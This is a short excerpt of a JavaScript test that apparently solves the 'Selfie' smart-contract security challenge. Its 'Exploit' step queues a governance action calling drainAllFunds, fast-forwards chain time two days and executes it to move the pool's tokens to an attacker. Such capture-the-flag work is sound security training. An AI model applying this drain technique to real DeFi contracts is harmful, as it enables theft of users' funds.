...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    ...
    /**
     * The main idea of this code is to queue an action that executes the drainAllFunds from pool, then execute the action and transfer all tokens to attacker
     */
    ...
    await selfieAttacker.connect(attacker).queuAttack();

    //Need to wait some time to execute the action
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

    await selfieAttacker.connect(attacker).executeAttack();
  });
